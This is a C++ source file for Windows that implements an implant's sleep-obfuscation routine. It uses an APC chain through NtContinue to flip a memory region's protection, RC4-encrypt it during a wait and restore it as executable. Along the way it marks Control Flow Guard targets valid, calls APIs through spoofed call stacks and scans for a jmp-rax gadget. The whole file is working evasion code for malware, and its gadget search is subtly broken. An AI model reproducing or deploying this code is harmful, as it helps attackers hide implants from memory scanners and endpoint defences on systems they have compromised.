#include <Windows.h>

#include "instance.h"
#include "ntdll.h"
#include "spoof.h"
#include "api.h"
#include "hash.h"

#define MODULE_SIZE(x)    (((PIMAGE_NT_HEADERS)((UINT_PTR)x + ((PIMAGE_DOS_HEADER)x)->e_lfanew))->OptionalHeader.SizeOfImage)
#define GADGET_SIZE		  2

typedef struct _USTRING
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING, * PUSTRING;

typedef struct _VM_INFORMATION
{
	DWORD					dwNumberOfOffsets;
	PULONG					plOutput;
	PCFG_CALL_TARGET_INFO	ptOffsets;
	PVOID					pMustBeZero;
	PVOID					pMoarZero;

} VM_INFORMATION, * PVM_INFORMATION;

typedef enum _VIRTUAL_MEMORY_INFORMATION_CLASS
{
	VmPrefetchInformation,
	VmPagePriorityInformation,
	VmCfgCallTargetInformation
} VIRTUAL_MEMORY_INFORMATION_CLASS;

typedef struct _MEMORY_RANGE_ENTRY
{
	PVOID  VirtualAddress;
	SIZE_T NumberOfBytes;
} MEMORY_RANGE_ENTRY, * PMEMORY_RANGE_ENTRY;

#pragma code_seg(".text$g")
extern "C" void __chkstk() {}

#pragma code_seg(".text$g")
BOOL markCFGValid_nt(PVOID pAddress, void* pNtQueryVirtualMemory, void* pNtSetInformationVirtualMemory)
{
	ULONG dwOutput = 0;
	NTSTATUS ntStatus = 0;
	MEMORY_BASIC_INFORMATION mbi = { 0 };
	VM_INFORMATION tVmInformation = { 0 };

	MEMORY_RANGE_ENTRY tVirtualAddresses = { 0 };
	CFG_CALL_TARGET_INFO OffsetInformation = { 0 };

	NTSTATUS status = (NTSTATUS)SPOOF_6(pNtQueryVirtualMemory, (HANDLE)-1, pAddress, (void*)MemoryBasicInformation, &mbi, (void*)sizeof(mbi), (void*)0);
	if (!NT_SUCCESS(status)) {
		return FALSE;
	}

	if (mbi.State != MEM_COMMIT || mbi.Type != MEM_IMAGE) {
		return FALSE;
	}

	OffsetInformation.Offset = (ULONG_PTR)pAddress - (ULONG_PTR)mbi.BaseAddress;
	OffsetInformation.Flags = CFG_CALL_TARGET_VALID;

	tVirtualAddresses.NumberOfBytes = (SIZE_T)mbi.RegionSize;
	tVirtualAddresses.VirtualAddress = (PVOID)mbi.BaseAddress;

	tVmInformation.dwNumberOfOffsets = 0x1;
	tVmInformation.plOutput = &dwOutput;
	tVmInformation.ptOffsets = &OffsetInformation;
	tVmInformation.pMustBeZero = 0x0;
	tVmInformation.pMoarZero = 0x0;

	ntStatus = (NTSTATUS)SPOOF_6(pNtSetInformationVirtualMemory, (HANDLE)-1, (void*)VmCfgCallTargetInformation, (void*)1, &tVirtualAddresses, (PVOID)&tVmInformation, (void*)sizeof(tVmInformation));
	if (0xC00000F4 == ntStatus) {
		ntStatus = (NTSTATUS)SPOOF_6(pNtSetInformationVirtualMemory, (HANDLE)-1, (void*)VmCfgCallTargetInformation, (void*)1, &tVirtualAddresses, (PVOID)&tVmInformation, (void*)24);
	}

	if (!NT_SUCCESS(ntStatus)) {
		if (0xC0000045 != ntStatus) {
			return FALSE;
		}
	}

	return TRUE;
}

#pragma code_seg(".text$g")
PVOID FindJmpRax(PVOID pModule)
{
	for (int i = 0; i < (MODULE_SIZE(pModule) - GADGET_SIZE) ; i++)
	{
		if (
			((PBYTE)pModule)[0] == 0xFF &&
			((PBYTE)pModule)[1] == 0xe0
			)
			return (PVOID)((UINT_PTR)pModule + i);
		else
			return FALSE;
	}
}


#pragma code_seg(".text$g")
VOID GenKey(PBYTE key, DWORD keySize, PINSTANCE_APC Inst)
{
	ULONG uSeed = 0x1337;

	for (int i = 0; i < keySize; i++)
	{
		key[i] = (DWORD)SPOOF_1(Inst->RtlRandom, (void*)&uSeed) % 255;
	}
}

#pragma code_seg(".text$g")
VOID Sleep_Kraken(void* pAddr, DWORD dwSize, DWORD dwSleepTime)
{

	DWORD dwTid = 0;

	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;

	CONTEXT ctxNoRace;
	CONTEXT ctxA;
	CONTEXT ctxB;
	CONTEXT ctxC;
	CONTEXT ctxD;
	CONTEXT ctxE;
	CONTEXT ctxEnd;

	INSTANCE_APC InstApc;

	if (!InitInstanceAPC(&InstApc))
	{
		__debugbreak();
		return;
	}

	if (!markCFGValid_nt(InstApc.NtContinue, InstApc.NtQueryVirtualMemory, InstApc.NtSetInformationVirtualMemory))
		return;


	BYTE KeyBuf[16];
	GenKey((PBYTE) & KeyBuf, 16, &InstApc);

	USTRING usKey = { 0 };
	USTRING usData = { 0 };

	usKey.Buffer = KeyBuf;
	usKey.Length = usKey.MaximumLength = 16;

	usData.Buffer = pAddr;
	usData.Length = usData.MaximumLength = dwSize;

	HANDLE hThread = SPOOF_6(InstApc.CreateThread, NULL, 0, (void*)(((UINT_PTR)InstApc.TpReleaseCleanupGroupMembers) + 0x450), NULL, (void*)CREATE_SUSPENDED, NULL);
	HANDLE hEventRace = SPOOF_4(InstApc.CreateEventW, NULL, NULL, NULL, NULL);

	DWORD dwOldProtect;

	if (hThread != NULL)
	{
		SPOOF_2(InstApc.GetThreadContext, hThread, &ctx);

		_memcpy(&ctxNoRace, &ctx, sizeof(CONTEXT));
		_memcpy(&ctxA, &ctx, sizeof(CONTEXT));
		_memcpy(&ctxB, &ctx, sizeof(CONTEXT));
		_memcpy(&ctxC, &ctx, sizeof(CONTEXT));
		_memcpy(&ctxD, &ctx, sizeof(CONTEXT));
		_memcpy(&ctxE, &ctx, sizeof(CONTEXT));
		_memcpy(&ctxEnd, &ctx, sizeof(CONTEXT));

		ctxNoRace.Rip = (DWORD64)InstApc.WaitForSingleObject;
		ctxNoRace.Rcx = (DWORD64)hEventRace;
		ctxNoRace.Rdx = INFINITE;
		*(PULONG_PTR)ctxNoRace.Rsp = (ULONG_PTR)InstApc.NtTestAlert;

		ctxA.Rip = (DWORD64)InstApc.VirtualProtect;
		ctxA.Rcx = (DWORD64)pAddr;
		ctxA.Rdx = dwSize;
		ctxA.R8 = PAGE_READWRITE;
		ctxA.R9 = (DWORD64) & dwOldProtect;
		*(PULONG_PTR)ctxA.Rsp = (ULONG_PTR)InstApc.NtTestAlert;

		ctxB.Rip = (DWORD64)InstApc.SystemFunction032;
		ctxB.Rcx = (DWORD64) & usData;
		ctxB.Rdx = (DWORD64) & usKey;
		*(PULONG_PTR)ctxB.Rsp = (ULONG_PTR)InstApc.NtTestAlert;

		ctxC.Rip = (DWORD64)InstApc.WaitForSingleObject;
		ctxC.Rcx = (DWORD64)(HANDLE)-1;
		ctxC.Rdx = dwSleepTime;
		*(PULONG_PTR)ctxC.Rsp = (ULONG_PTR)InstApc.NtTestAlert;

		ctxD.Rip = (DWORD64)InstApc.SystemFunction032;
		ctxD.Rcx = (DWORD64)&usData;
		ctxD.Rdx = (DWORD64)&usKey;
		*(PULONG_PTR)ctxD.Rsp = (ULONG_PTR)InstApc.NtTestAlert;

		ctxE.Rip = (DWORD64)InstApc.VirtualProtect;
		ctxE.Rcx = (DWORD64)pAddr;
		ctxE.Rdx = dwSize;
		ctxE.R8 = PAGE_EXECUTE_READWRITE;
		ctxE.R9 = (DWORD64)&dwOldProtect;
		*(PULONG_PTR)ctxE.Rsp = (ULONG_PTR)InstApc.NtTestAlert;

		ctxEnd.Rip = (DWORD64)InstApc.RtlExitUserThread;
		ctxEnd.Rcx = 0;
		*(PULONG_PTR)ctxEnd.Rsp = (ULONG_PTR)InstApc.NtTestAlert;

		SPOOF_3(InstApc.QueueUserApc, InstApc.NtContinue, hThread, &ctxNoRace);
		SPOOF_3(InstApc.QueueUserApc, InstApc.NtContinue, hThread, &ctxA);
		SPOOF_3(InstApc.QueueUserApc, InstApc.NtContinue, hThread, &ctxB);
		SPOOF_3(InstApc.QueueUserApc, InstApc.NtContinue, hThread, &ctxC);
		SPOOF_3(InstApc.QueueUserApc, InstApc.NtContinue, hThread, &ctxD);
		SPOOF_3(InstApc.QueueUserApc, InstApc.NtContinue, hThread, &ctxE);
		SPOOF_3(InstApc.QueueUserApc, InstApc.NtContinue, hThread, &ctxEnd);

		SPOOF_2(InstApc.NtResumeThread, hThread, NULL);
		SPOOF_4(InstApc.NtSignalAndWaitForSingleObject, hEventRace, hThread, FALSE, NULL);

	}

	SPOOF_1(InstApc.CloseHandle, hThread);

}
